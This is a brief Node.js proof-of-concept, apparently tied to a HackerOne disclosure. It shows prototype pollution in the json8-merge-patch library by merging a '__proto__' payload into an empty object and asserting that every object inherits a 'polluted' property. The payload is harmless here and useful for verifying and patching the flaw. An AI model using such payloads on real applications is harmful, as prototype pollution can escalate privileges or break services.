//https://hackerone.com/reports/980649

const { assert } = require("@firebase/util");
let json8mergepatch = require("json8-merge-patch");
var obj = {}
console.log("Before : " + obj.isAdmin);
json8mergepatch.apply(obj, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));
console.log("After : " + obj.isAdmin);
assert({}.polluted === "yes");
console.log("payload success!");
